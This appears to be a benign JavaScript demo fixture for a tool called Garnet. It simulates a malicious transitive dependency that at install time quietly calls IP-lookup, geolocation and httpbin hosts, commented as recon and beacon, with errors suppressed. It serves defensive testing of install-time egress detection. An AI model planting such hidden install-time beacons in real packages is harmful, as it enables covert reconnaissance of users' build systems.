// BENIGN DEMO FIXTURE — not malware. Simulates the class of behaviour seen in
// real supply-chain incidents: a deep transitive dependency that, at INSTALL
// time, performs host/network reconnaissance and beacons out. None of this is
// visible in a PR that merely adds the top-level package. It is here to prove
// that Garnet's runtime record surfaces install-time egress the diff cannot.
const https = require('https');
// Recon + beacon to off-registry hosts (all real, reachable, harmless):
//   api.ipify.org  -> the runner's public IP        (recon)
//   ip-api.com     -> geolocation of that IP         (recon)
//   httpbin.org    -> exfil/beacon sink              (beacon)
const HOSTS = ['api.ipify.org', 'ip-api.com', 'httpbin.org'];
for (const h of HOSTS) {
  try {
    const req = https.get('https://' + h + '/', (r) => r.resume());
    req.on('error', () => {});
    req.setTimeout(4000, () => req.destroy());
  } catch (e) { /* never fail the install */ }
}
